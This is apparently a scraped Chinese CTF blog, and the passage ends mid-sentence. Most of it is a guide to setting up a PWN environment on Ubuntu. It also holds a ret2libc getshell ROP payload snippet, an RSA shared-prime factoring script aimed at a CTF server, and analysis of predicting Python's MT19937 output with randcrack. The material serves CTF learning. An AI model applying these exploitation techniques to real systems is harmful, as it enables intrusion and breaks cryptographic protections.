#使用pwndbg,其他同理 _gdb(1) 4. gdb-multiarch（可选）\n（目前可能还用不到，大家可以先跳过）\n以下为ARM和MIPS的交叉编译及运行环境，安装可参考 hollk 大佬的文章：\nubuntu20.04 PWN（含x86、ARM、MIPS）环境搭建\ngdb-multiarch gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu gcc-mips-linux-gnu gcc-mipsel-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mips64el-linux-gnuabi64 ARM PWN —— ARM软件包 MIPS PWN —— MIPS软件包 python PWN 相关库\npwntools # （ps：后面的工具比较多，可以专门在根目录上新建一个tools文件夹来放工具）\n# pip3直接安装： sudo apt-get update sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools # 先git下来再用pip3安装：（好像法2会快一些） git clone https://github.com/Gallopsled/pwntools.git sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools # 检测是否安装成功 python3 from pwn import * # 没有报错就说明装好了 注：输入 quit() 退出Python交互模式\n又注：之前用户名为\u0026quot;pwner\u0026quot;的虚拟机是入门时用到现在的老虚拟机，还是默认背景和配色，用户名为\u0026quot;ta0lve\u0026quot;的虚拟机是今天刚装的新虚拟机，个性化配置见本文的最后： terminator （可选）\n基本使用方法：\npwntools的安装及基本使用\npwntools — pwntools 4.10.0 documentation\nLibcSearcher # # 安装步骤一： sudo pip3 install LibcSearcher # 最好先完成步骤一再完成步骤二，不过可能会由于网络问题安装不了， # 可以多试几次，实在不行再直接完成步骤二 # 只完成了步骤二如果在使用时出现“No Moudule Name LibcSearcher”， # 可以将py文件复制到LibcSearcher根目录下， # 或是将LibcSearcher整个文件夹复制一份到py文件所在的文件夹下 # 安装步骤二： git clone https://github.com/lieanu/LibcSearcher.git cd LibcSearcher sudo python3 setup.py install 输入pip list 查看我们下载好的库（只完成步骤二可能找不到）\n查看 LibcSearcher.egg-link文件可以发现：\n说明步骤一也是可以使用步骤二的本地仓库的，所以建议两个都使用~\n当然，只完成步骤一也可以正常使用。\n# 检测是否安装成功 python3 from LibcSearcher import * （如果两个方法都不行可以看一看这个： LibcSearcher安装的心路历程和坑）\n基本使用方法：（还没入门的师傅们可以等学到ret2libc的时候再看）\nfrom pwn import * from LibcSearcher import * # 接收函数的got表的地址,比如我这里拿到puts函数的真实地址 puts_real_addr = u64(taolve.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) log.success(\u0026#34;puts_real_addr:\u0026#34;+ hex(puts_real_addr)) # 打印出来给自己看一看 libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts_real_addr) libc.add_condition(\u0026#34;atoi\u0026#34;, 218528) # 添加一个约束条件 libc_base = puts_real_addr - libc.dump(\u0026#39;puts\u0026#39;) # 养成好习惯，打印一下libc_base看看是不是后三位为0 log.success(\u0026#39;libc_base \u0026#39; + hex(libc_base)) system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) # 构造payload, 准备getshell payload = b\u0026#34;a\u0026#34;*offset + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) #+p64(vuln) 注：其实大家装一个LibcSearcher库就够用了，后面几个库可以直接跳过\nLibcSearcher3 （可选）\n# 安装 pip3 install LibcSearcher3 # 检测是否安装成功 python3 from LibcSearcher3 import * 相关说明：\nLibcSearcher3 · PyPI\nLibcSearcherX （可选）\n（这个我没装）\niptL-F4ck/LibcSearcherX (github.com)\npwnmodules （可选）\n（这个我也没装 🐶 ）\nPwnModules · PyPI\nPWN 相关工具 # 现在不知道怎么用、什么时候用很正常，可以先装好，反正以后迟早会用到的[doge]\n当然也可以先标记一下等到时候有需要再回来看。\nROPgadget # 该工具允许在二进制文件中搜索小工具，以促进对ROP的利用。ROPgadget支持x86、x64、ARM、ARM64、PowerPC、SPARC和MIPS架构下的ELF/PE/Mach-O格式\n完成基本ROP题型时方便我们构造ROP链\n# 安装 sudo pip3 install capstone git clone https://github.com/JonathanSalwan/ROPgadget.git cd ROPgadget sudo python3 setup.py install # 检测是否安装成功 ROPgadget -V 如果报错了，可以按下面的方法解决：\n# 报错详情： ...Error: Script \u0026#39;scripts/ROPgadget\u0026#39; not found in metadata at \u0026#39;/home/ta0lve/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info\u0026#39; # 复制这个报错的路径 # 解决： cd ROPgadget # 进入你们git的目录里，已经进去了就不用输这个命令了 sudo cp -r scripts 你复制的路径 # 示例： sudo cp -r scripts /home/ta0lve/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info 基础用法：\n# 其中的pwn是我们的二进制文件 ROPgadget --binary pwn --only \u0026#34;pop|ret\u0026#34; | grep rax ROPgadget --binary pwn --only “int” ROPgadget --binary pwn --string \u0026#34;/bin/sh\u0026#34; # 辨析： ROPgadget --binary pwn | grep ret # 含有ret指令的都符合 ROPgadget --binary pwn --only \u0026#34;ret\u0026#34; # 只含有ret指令的 one_gadget # 在ctf-pwn中大部分情况需要获得远程shell，one_gadget会自动查找ELF文件中的execve(‘/bin/sh’, NULL, NULL)，通过exploit实现RCE（远程代码执行）\n查找可以用来 getshell 的指令\n# 安装 sudo apt install -y ruby ruby-dev sudo gem install one_gadget # 检测是否安装成功 one_gadget --version 基础用法：\none_gadget libc.so.6 \u0026#34;\u0026#34;\u0026#34; 输出： 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL \u0026#34;\u0026#34;\u0026#34; glibc-all-in_one # glibc-all-in-one 是一个开源项目，里面有各种版本的glibc 源码。\n## git安装 git clone https://github.com/matrix1001/glibc-all-in-one cd glibc-all-in-one sudo python3 update_list ## 使用 # 获取可以更新的glibc的版本 ./update_list # 查看可下载的glibc cat list # glibc为要下载glibc的名字 #（题目应该会有提示，或者ida里面也有相关信息） sudo ./download glibc ## 示例： sudo ./download 2.23-0ubuntu11.3_amd64 ## 关于 old_list文件： # old_list中的是过时的glibc文件，一般不会用到， # 如果需要下载old_list里面对应的glibc， # 要用./download_old进行下载操作。（用./download会报错） 下载好之后目录里ld.so文件是链接器，libc.so文件是glibc文件\npatchelf # 用于修改现有ELF可执行文件和库的简单实用程序\n非常实用的一个工具！\n# 安装 sudo apt install patchelf # 检测是否安装成功 patchelf --version 基础用法：\n## 其中的pwn是我们的二进制文件 # 更换链接器 ld.so 文件 patchelf --set-interpreter ld的硬路径 ./pwn # 直接选择 glibc libc.so 文件 patchelf --replace-needed libc.so.6 你要换的libc的硬路径 ./pwn # 更换glibc搜索路径： patchelf --set-rpath glibc-all-in-one下载的文件夹 ./pwn # 查看elf的ld和libc ldd ./pwn ## 示例： patchelf --set-interpreter ~/my_tools/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./pwn patchelf --replace-needed libc.so.6 ./libc-2.23.so ./pwn patchelf --set-rpath ~/my_tools/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 ./pwn # 检查： ldd ./pwn 如果觉得太麻烦了，其实也可以直接在exp里面指定：\n# 利用pwntools加载不同版本libc调试程序 # 这个方法最好将链接器ld.so和题目给我们的libc.so复制到当前目录下 taolve = process([\u0026#34;ld.so\u0026#34;, \u0026#34;./pwn\u0026#34;], env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;libc.so.6\u0026#34;}) # 示例：(这是我常用的脚本开头部分) from pwn import * from LibcSearcher3 import * is_debug = 1 is_remote = 0 # is_remote == 2时可以利用pwntools加载不同版本libc调试程序 is_gdb = 0 if is_debug: context.log_level = \u0026#39;debug\u0026#39; if is_remote == 1: taolve = remote(\u0026#34;ip\u0026#34;, post) elif is_remote == 2: taolve = process([\u0026#34;./ld-2.23.so\u0026#34;, \u0026#39;./pwn\u0026#39;], env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc-2.23.so\u0026#34;}) else: taolve = process(\u0026#39;./pwn\u0026#39;) def _gdb(my_gdb): if my_gdb == 1: os.system(\u0026#34;echo \\\u0026#34;source ~/pwndbg/gdbinit.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 2: os.system(\u0026#34;echo \\\u0026#34;source ~/gef/gef.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) elif my_gdb == 3: os.system(\u0026#34;echo \\\u0026#34;source ~/peda/peda.py\\\u0026#34; \u0026gt; ~/.gdbinit\u0026#34;) gdb.attach(taolve) _gdb(is_gdb) 推荐阅读：\nCTF pwn中利用pwntools加载不同版本libc调试程序的方法\npwn相关命令补充： # （这些命令都是linux自带的，只是过一下一些比较常用的命令）\nstrings的使用\n# 搜索字符串 strings pwn \u0026#34;ctf\u0026#34; # 查看一个libc的版本(看使用什么版本的连接器) strings libc.so.6 |grep GLIBC \u0026#34;\u0026#34;\u0026#34; 输出： GLIBC_2.2.5 GLIBC_2.2.6 ... GLIBC_2.23 GLIBC_PRIVATE GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al. \u0026#34;\u0026#34;\u0026#34; # 所以这个 libc.so 文件是2.23版本的 # 使用 2.23-0ubuntu11.3 的链接器 # ~/my_tools/pwn_tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so objdump 的使用\nobjdump命令，一般用于显示二进制文件的信息\n# 其中的pwn是我们的二进制文件 # 示例图就不放了，师傅们可以直接在自己的linux里执行一下看看 # 整体信息 objdump -f pwn # 所有段 objdump -p pwn # 所有节 objdump -h pwn # 所有段 + 所有节 + 所有符号 objdump +x pwn # 可执行部分并反汇编 objdump -d pwn # 所有节反汇编 objdump -D pwn # 显示所有节的 16 进制内容（可看 got 表） objdump -s pwn # 符号表 objdump -t pwn # 动态符号表 objdump -T pwn # 重定位信息 objdump -R pwn # 仅反汇编指定的section。可以有多个-j参数来选择多个section -j section # 指定节的内容 objdump -s -j .got pwn 以下是我个人比较常用的，欢迎师傅们补充：\n# 查看plt符号表的调用地址 objdump -d pwn | grep \u0026#34;plt\u0026#34; objdump -R pwn objdump -s -j .got pwn 关于objdump的其他反汇编命令的使用，可阅读：\nobjdump反汇编命令使用指南\nreadelf 的使用\nreadelf命令，一般用于查看ELF格式的文件信息\n# 示例： readelf pwn -h -a , --all 显示全部信息,等价于 -h -l -S -s -r -d -V -A -I 。 -h , --file-header 显示 elf 文件开始的文件头信息. -l , --program-headers , --segments 显示程序头（段头）信息(如果有的话)。 -S , --section-headers , --sections 显示节头信息(如果有的话)。 -g , --section-groups 显示节组信息(如果有的话)。 -t , --section-details 显示节的详细信息( -S 的)。 -s , --syms , --symbols 显示符号表段中的项（如果有的话）。 -e , --headers 显示全部头信息，等价于: -h -l -S -n , --notes 显示 note 段（内核注释）的信息。 -r , --relocs 显示可重定位段的信息。 -u , --unwind 显示 unwind 段信息。当前只支持 IA64 ELF 的 unwind 段信息。 -d , --dynamic 显示动态段的信息。 -V , --version-info 显示版本段的信息。 -A , --arch-specific 显示 CPU 构架信息。 -D , --use-dynamic 使用动态段中的符号表显示符号，而不是使用符号段。 -x , --hex-dump= 以16进制方式显示指定段内内容。 number 指定段表中段的索引,或字符串指定文件中的段名。 -w[liaprmfFsoR] or –debug-dump[=line,=info,=abbrev,=pubnames,=aranges,=macro,=frames,=frames-interp,=str,=loc,=Ranges] 显示调试段中指定的内容。 -I , --histogram 显示符号的时候，显示 bucket list 长度的柱状图。 -v , --version 显示 readelf 的版本信息。 -H , --help 显示 readelf 所支持的命令行选项。 -W , --wide 宽行输出。 参考： Linux命令学习手册-readelf checksec\n这个命令可以识别二进制文件的安全属性 ，即检测我们的二进制程序的保护机制的开关情况，可以在Linux中安装，也可以在三个gdb插件中直接使用。\n不过gdb中的checksec版本较老，检测的保护机制种类较少，所以还是建议大家都安装一个\n# 安装后在终端命令行中使用 sudo apt install checksec checksec --file=pwn # 在带插件的gdb中使用 gdb pwn checksec seccomp-tools # seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall，这是不安全的，比如劫持程序流后通过execve的syscall来getshell。通过seccomp我们可以在程序中禁用掉某些syscall，这样就算劫持了程序流也只能调用部分的syscall了\nseccomp-tools项目旨在(但不限于)分析CTF pwn挑战中的seccomp沙盒。有些特性可能是特定于ctf的，但对于分析真实情况下的seccomp仍然有用\n用于分析沙盒的工具\n# 安装 sudo gem install seccomp-tools # 检测是否安装成功 seccomp-tools --version # 使用： seccomp-tools dump ./pwn # 可以知道哪些syscall被系统被禁用 main_arena_offset（可跳） # 用来计算 main_arena 的偏移工具\n# 安装 git clone https://github.com/bash-c/main_arena_offset.git cd main_arena_offset # 检测是否安装成功 ./main_arena /lib/x86_64-linux-gnu/libc.so.6 也可以用 dev2ero 库中封装的 py_main_arena_offsetpy 模块来计算main_arena的偏移。\nfrom pymao import * libc = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; main_arena_offset = gmao(blic) main_arena_offset Crypto 相关工具（可跳） # 累了，我先挖个坑，下次再更新 _(:з」∠)_\ngym2\nsage math（Crypto）\n提高体验的相关工具 # Oh-My-Zsh （可选） # # 安装： git clone https://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc # 更改你的默认 Shell： chsh -s /bin/zsh 使用参考：\nOh-My-Zsh的配置与使用\nterminator （可选） # 一个终端软件，只是用来优化体验的（毕竟打pwn的话以后可能会较为频繁地使用终端），赶时间的师傅可以跳过~\n# 安装： sudo apt update sudo apt install terminator # 自定义： cd ~/.config/terminator/ sudo gedit config # 注意这个config文件以及terminator文件夹可能一开始不存在， # 可以自己新建文件夹再创建.一样会生效的 常用快捷键：\n（操作方面）\nCtrl + Shift + C 复制\nCtrl + Shift + V 粘贴\nCtrl + Shift + F 在当前窗口搜索\nCtrl + Shift + G 清屏\nCtrl + Shift + N 或者 Ctrl + Tab 在分割的各窗口之间切换\nCtrl + Shift + W 关闭当前终端\nCtrl + Shift + Q 关闭所有终端（退出程序）\nCtrl + Alt + T 启动终端（不安装terminator则是Ubuntu自带的terminal）\n（窗口方面）\nF11 全屏\nCtrl + Shift + O 水平分割终端（分成上下两个窗口）\nCtrl + Shift + E 垂直分割终端（分成左右两个窗口）\nCtrl + Shift + Right/Left 在垂直分割的终端中将分割条向右/左移动\nCtrl + Shift + X 放大（还原）当前终端（将分割的某一个窗口放大至全屏使用）\nCtrl + Shift + S 隐藏/显示滚动条\nCtrl + Shift + Z 从放大至全屏的某一窗口回到多窗格界面\n（其他快捷键）\nSearch for a Keyword – Ctrl+Shift+f（好用的搜索功能）\nMove to Next Terminal – Ctrl+Shift+N or Ctrl+Tab\nMove Parent Dragbar Right – Ctrl+Shift+Right_Arrow_key\nMove Parent Dragbar Left – Ctrl+Shift+Left_Arrow_key\nMove Parent Dragbar Up – Ctrl+Shift+Up_Arrow_key\nMove Parent Dragbar Down – Ctrl+Shift+Down_Arrow_key\nHide/Show Scrollbar – Ctrl+Shift+s\nMove to the Above Terminal – Alt+Up_Arrow_Key\nMove to the Below Terminal – Alt+Down_Arrow_Key\nMove to the Left Terminal – Alt+Left_Arrow_Key\nMove to the Right Terminal – Alt+Right_Arrow_Key\nCopy a text to clipboard – Ctrl+Shift+c\nPaste a text from Clipboard – Ctrl+Shift+v\nClose the Current Terminal – Ctrl+Shift+w\nQuit the Terminator – Ctrl+Shift+q\nToggle Between Terminals（切换终端） – Ctrl+Shift+x\nOpen New Tab – Ctrl+Shift+t\nMove to Next Tab – Ctrl+page_Down\nMove to Previous Tab – Ctrl+Page_up\nIncrease Font size – Ctrl+(+)\nDecrease Font Size – Ctrl+(-)\nReset Font Size to Original – Ctrl+0\nToggle Full Screen Mode – F11\nReset Terminal – Ctrl+Shift+R\nReset Terminal and Clear Window – Ctrl+Shift+G\nRemove all the terminal grouping – Super+Shift+t\nGroup all Terminal into one – Super+g\nconfig 文件内容可以照搬：\n（我们还可以顺便把桌面背景给换了，这样终端设置为透明的就有一个背景了）\n# 示例1：(如果直接复制粘贴不行就把注释删掉) [global_config] handle_size = -3 title_transmit_fg_color = \u0026#34;#000000\u0026#34; title_transmit_bg_color = \u0026#34;#3e3838\u0026#34; inactive_color_offset = 1.0 enabled_plugins = CustomCommandsMenu, LaunchpadCodeURLHandler, APTURLHandler, LaunchpadBugURLHandler suppress_multiple_term_dialog = True [keybindings] [profiles] [[default]] background_color = \u0026#34;#373737\u0026#34; background_darkness = 0.8 background_type = transparent cursor_shape = ibeam cursor_color = \u0026#34;#e8e8e8\u0026#34; font = Ubuntu Mono 14 foreground_color = \u0026#34;#e8e8e8\u0026#34; copy_on_selection = True # 选择文本时同时将数据拷贝到剪切板中,强烈推荐 show_titlebar = False scroll_background = False scrollback_lines = 3000 palette = \u0026#34;#292424:#5a8e1c:#00ff00:#cdcd00:#1e90ff:#cd00cd:#00cdcd:#d6d9d4:#4c4c4c:#868e09:#00ff00:#ffff00:#4682b4:#ff00ff:#00ffff:#ffffff\u0026#34; use_system_font = False [layouts] [[default]] [[[child1]]] parent = window0 profile = default type = Terminal [[[window0]]] parent = \u0026#34;\u0026#34; size = 925, 570 type = Window [plugins] # 示例2：(如果直接复制粘贴不行就把注释删掉) [global_config] title_transmit_bg_color = \u0026#34;#d30102\u0026#34; focus = system suppress_multiple_term_dialog = True [keybindings] [profiles] [[default]] palette = \u0026#34;#2d2d2d:#f2777a:#99cc99:#ffcc66:#6699cc:#cc99cc:#66cccc:#d3d0c8:#747369:#f2777a:#99cc99:#ffcc66:#6699cc:#cc99cc:#66cccc:#f2f0ec\u0026#34; background_color = \u0026#34;#2D2D2D\u0026#34; # 背景颜色 background_image = None background_darkness = 0.85 cursor_color = \u0026#34;#2D2D2D\u0026#34; # 光标颜色 cursor_blink = True # 光标是否闪烁 foreground_color = \u0026#34;#EEE9E9\u0026#34; # 文字的颜色 use_system_font = False # 是否启用系统字体 font = Ubuntu Mono 13 # 字体设置，后面的数字表示字体大小 copy_on_selection = True # 选择文本时同时将数据拷贝到剪切板中 show_titlebar = False # 不显示标题栏，也就是 terminator 中那个默认的红色的标题栏 [layouts] [[default]] [[[child1]]] type = Terminal parent = window0 profile = default [[[window0]]] type = Window parent = \u0026#34;\u0026#34; [plugins] 示例1截图：（也是我自己的桌面）\n背景图片（可能加载有点慢）：\n参考链接：\nUbuntu中终端分屏工具terminator的安装和使用\nTerminator的安装和配置(颜色和字体)\nterminator安装、美化、使用及闪退解决\nTerminator终端的安装，配置以及如何修改默认终端\n附录 # 本文其他的参考链接及推荐阅读：\nubuntu20.04 PWN（含x86、ARM、MIPS）环境搭建\nUbuntu22.04搭建PWN环境\npwn基础 PWN环境搭建\n","date":"July 10, 2023","permalink":"/posts/pwn/basic/pwn-_environment/","section":"Posts","summary":"前言 # 学习pwn已经有一段时间了，但是由于之前自己一直没有注","title":"PWN环境搭建记录-Ubuntu 22.04"},{"content":"","date":"July 10, 2023","permalink":"/categories/pwn%E5%85%A5%E9%97%A8/","section":"Categories","summary":"","title":"pwn入门"},{"content":" misc学习 # 杂项简介 - CTF Wiki CTF——misc指南【长期更新】 #师傅总结得非常好，我哭死，感觉我的misc有救了🙏\nCTF misc图片类总结（入门级） #怕自己太久没做忘记了，放在这防忘记\n编码与解码相关工具 # base64解码 base64编码 #用起来一般般\nCipher Identifier #比较好的古典密码学解密工具，可以分析密文的加密方式\n兽音译者在线编码解码 - 兽音翻译咆哮体加密解密 #奇怪的编码方式增加了\n其他工具 # 图片文字识别（有道） #有时候flag或者密文在一张图片上\n图片转文字在线 （白描） #而且还要你手打的时候就可以用上了\nOSINT 学习 # (3条消息) ctf菜狗杯OSINT wp #师傅的wp，超多社工题\n","date":"July 6, 2023","permalink":"/pointer/%E4%B9%A6%E7%AD%BE/misc%E4%B9%A6%E7%AD%BE/","section":"Pointers","summary":"misc学习 # 杂项简介 - CTF Wiki CTF——misc指南【长期更新","title":"misc相关-书签"},{"content":" 堆回顾与再学习 # 堆溢出_hollk的博客-CSDN博客\n基础知识复习 # pwntools — pwntools 4.10.0 documentation\nPWN学习总结（不断完善中）\n超全PWN入门笔记，从栈到堆一步到位 ","date":"July 6, 2023","permalink":"/pointer/%E4%B9%A6%E7%AD%BE/pwn%E4%B9%A6%E7%AD%BE/","section":"Pointers","summary":"堆回顾与再学习 # 堆溢出_hollk的博客-CSDN博客 基础知","title":"pwn学习-书签"},{"content":"前排提醒：\n该文章中的工具都没什么大用，路过的师傅们可以直接前往下一篇文章：\n2023 ciscn 初赛 · ta0lve\n以下为没什么大用的工具网站的链接：\nmd文档 emoji 表情短代码 #写文章常用emoji必备\nRGB颜色值与十六进制颜色码转换工具 #虽然没大用\n图片文字识别 #有时候flag或者密文在一张图片上还要你手打的时候就可以用上了\nSearch Icons #查找icon图片的网站\n在图像中裁剪圆形\n","date":"July 6, 2023","permalink":"/pointer/%E4%B9%A6%E7%AD%BE/%E5%B7%A5%E5%85%B7%E7%BD%91%E5%9D%80/","section":"Pointers","summary":"前排提醒： 该文章中的工具都没什么大用，路过的师傅们可以直接前","title":"一些没什么大用的工具的链接"},{"content":"","date":"July 5, 2023","permalink":"/tags/crypto/","section":"Tags","summary":"","title":"Crypto"},{"content":"此文章仅限战队内部成员阅读\n路过的师傅们看看远处的wp吧：\n2023 ciscn 初赛 · ta0lve\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r题目描述 # 在RSA中，素数的选择和保密性非常重要。\n只要不泄露n的分解，那RSA就是安全的。\n**hint ：**GZ的脑容量有限，存不下太多的质数\n分析与解题脚本 # hint 提示为：GZ 的脑容量有限，存不下太多的质数， 所以可以推测出在生成的足够多个 n 中会有两个 n 有公约数，而求公约数我们可以使用gmpy2.gcd()函数块数求出。 Python脚本如下：\nfrom pwn import* import os from Crypto.Util.number import * import gmpy2 import binascii def Decrypt(c, e, p, n): q = n//p L = (p - 1) * (q - 1) d = gmpy2.invert(e, L) m = gmpy2.powmod(c, d, n) #得到密文 m flag2 = hex(m) flag1 = str(flag2[2:]) flag = binascii.unhexlify(flag1) print(flag.decode(\u0026#39;utf-8\u0026#39;)) #打印flag n = list(range(101)) e = list(range(101)) c = list(range(101)) num = 50 for i in range(num): #学会使用try: except: 来多次连接断开得到数据 try: taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 39227) taolve.recvuntil(b\u0026#34;n = \u0026#34;) n[i] = int(taolve.recvuntil(b\u0026#34;\\ne = \u0026#34;, drop=True)) e[i] = int(taolve.recvuntil(b\u0026#34;\\nc = \u0026#34;, drop=True)) c[i] = int(taolve.recvuntil(b\u0026#34;\\n\u0026#34;, drop=True)) except: taolve.close() print(\u0026#34;=============next step====================\u0026#34;) for i in range(num-1): for j in range(k): if i==j: continue p = gmpy2.gcd(n[i], n[j]) if p \u0026gt; 1 : #print(i, j) print(\u0026#34;p = \u0026#34;, p) print(\u0026#34;n1 = \u0026#34;, n[i]) print(\u0026#34;n2 = \u0026#34;, n[j]) print(\u0026#34;e1 = \u0026#34;, e[i]) print(\u0026#34;e2 = \u0026#34;, e[j]) print(\u0026#34;c1 = \u0026#34;, c[i]) print(\u0026#34;c2 = \u0026#34;, c[j]) Decrypt(c[i], e[i], p, n[i]) Decrypt(c[j], e[j], p, n[j]) q1 = n[i] // p q2 = n[j] // p if p*q1 == n[i] and p*q2 == n[j]: print(\u0026#34;q1 = \u0026#34;, q1) print(\u0026#34;q2 = \u0026#34;, q2) print(\u0026#34;n1 = \u0026#34;, n[i]) print(\u0026#34;n2 = \u0026#34;, n[j]) print(\u0026#34;e1 = \u0026#34;, e[i]) print(\u0026#34;e2 = \u0026#34;, e[j]) print(\u0026#34;c1 = \u0026#34;, c[i]) print(\u0026#34;c2 = \u0026#34;, c[j]) else : print(p,end=\u0026#34;\u0026#34;) #用1来标记没有结果的尝试 输出结果：\nW4terCTF{1T_ls_dang3ROus_7O_US3_A_pRlM3_TwlCe!!!!!!!}\n实战截图： ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/6_gz-rsa_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章仅限战队内部成员阅读\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的wp吧：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn 初赛 · ta0lve\u003c/a\u003e\u003c/p\u003e","title":"Crypto-GZ RSA"},{"content":"","date":"July 5, 2023","permalink":"/tags/misc/","section":"Tags","summary":"","title":"misc"},{"content":"此文章仅限战队内部成员阅读\n路过的师傅们看看远处的wp吧：\n2023 ciscn 初赛 · ta0lve\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r0.题目描述 # 据说泷奈拿到了新情报？\n能不能假装千束将情报骗到手就靠你了！\n#下载题目附件后得到main.py： import os import random from hashlib import md5 random.seed(os.urandom(64)) 情报 = os.environ[\u0026#39;GZCTF_FLAG\u0026#39;] V 底线 = 512 石头剪刀布映射 = [\u0026#34;石头\u0026#34;, \u0026#34;剪刀\u0026#34;, \u0026#34;布\u0026#34;] def 石头剪刀布(): 随机数 = random.getrandbits(32) #随机数 = 1 猜拳 = 石头剪刀布映射[随机数 % 3] 轮哈希 = int(md5(str(随机数 % 3).encode()).hexdigest()[4:12], 16) 轮标识符 = (随机数 // 3) ^ 轮哈希 return hex(轮标识符)[2:].zfill(8), 猜拳 def 检查(猜拳, 输入): return 猜拳 == \u0026#34;石头\u0026#34; and 输入 == \u0026#34;布\u0026#34; or \\ 猜拳 == \u0026#34;剪刀\u0026#34; and 输入 == \u0026#34;石头\u0026#34; or \\ 猜拳 == \u0026#34;布\u0026#34; and 输入 == \u0026#34;剪刀\u0026#34; def 玩(模式): print(\u0026#39;- 开始了哦！（平局也算你输哦）\u0026#39;) 轮 = 0 while 轮 \u0026lt; 底线: 轮 += 1 轮标识符, 猜拳 = 石头剪刀布() print(f\u0026#39;\\nRound {轮}: #{轮标识符}\u0026#39;) print(\u0026#34;- 我准备好了\u0026#34;) while True: 输入 = input(\u0026#34;- 石头剪刀布！，我出 \u0026gt; \u0026#34;).strip() if 输入 in [\u0026#34;石头\u0026#34;, \u0026#34;剪刀\u0026#34;, \u0026#34;布\u0026#34;]: print(f\u0026#34;- 我出的是 {猜拳}\u0026#34;) break print(\u0026#34;- 干嘛呢，出 石头/剪刀/布 啊\u0026#34;) 结果 = 检查(猜拳, 输入) print(\u0026#34;- 你赢了\u0026#34; if 结果 else \u0026#34;- 你输了\u0026#34;) if 模式 == 1 and not 结果: print(\u0026#34;你才不是真的千束！你个坏蛋！！\u0026#34;) return 轮 - 1 return 底线 def 选择模式(): print(\u0026#39;请选择模式:\u0026#39;) print(\u0026#39;0: 适应模式（输了不会怪你哦）\u0026#39;) print(\u0026#39;1: 认真模式\u0026#39;) 模式 = int(input(\u0026#39;\u0026gt; \u0026#39;)) assert 0 \u0026lt;= 模式 \u0026lt;= 1 return 模式 if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#39;井之上泷奈出现在了你面前……\\n\u0026#39;) print(\u0026#39;- 想要我得到的情报？\u0026#39;) print(\u0026#39;- 嗯嗯\u0026#39;) print(\u0026#39;- 你真的是千束吗……？\u0026#39;) print(\u0026#39;- 是的呀\u0026#39;) print(\u0026#39;- 在石头剪刀布中，只要我不使用特殊手段，千束一定会 100% 赢我，就用这个来验证你的身份吧！\u0026#39;) print(\u0026#39;- 诶多，这个嘛……\\n\u0026#39;) try: while True: 模式 = 选择模式() 终 = 玩(模式) if 模式 == 0: print(\u0026#39;- 可以开始了吗？\u0026#39;) continue if not 终 \u0026lt; 底线: print(\u0026#39;- 你……真的是千束！\\n\u0026#39;) print(f\u0026#39;那就给你情报吧: {情报}\u0026#39;) break except: print(\u0026#39;- 你是不是在搞什么鬼啊！\u0026#39;) exit(0) 1.分析伪随机数漏洞： # 分析一下程序，可以看到泷奈出拳是由随机数生成函数random.getrandbits(32)决定的，搜索相关资料会发现，这个函数所使用的是梅森算法MT19937，虽然能够产生优秀的伪随机数，但是有一个漏洞：其生成的数据在62432（62332=19936）后会达到循环，所以当我们知道了在同一个程序中生成的前624个由梅森算法产生的32位随机数，就能够预测下一个产生的随机数。\n2.如何实现预测？ # 预测伪随机数我们可以使用randcrack库 的Python库进行预测：\n安装 pip install randcrack -i https://pypi.tuna.tsinghua.edu.cn/simple 用法 import random #导入random库（Python内置了） from randcrack import RandCrack #下载randcrack库后导入类 #你可以掷随机数种子来确保预测的有效性， #不过random预测的时候默认以当前时间作为随机数种子 rc = RandCrack()#实例化randcrack类 for i in range(624):#循环624次 rc.submit(random.getrandbits(32)) #每次循环提交一个32位random生成的随机数 print(random.getrandbits(32)) #利用random库获取一个32位的随机数（你可以修改为任意位数，比如64位） print(rc.predict_getrandbits(32)) #利用randcrack获取的随机数 分析一下main函数代码的逻辑，可以看到选择模式函数中可以选择适应模式与认真模式，而且适应模式可以进行多次而不退出程序，所以我们需要进行进行两次适应模式，并且算出泷奈的前624次出拳时产生的随机数，再利用randcrack 的Python库进行预测。 分析代码中的 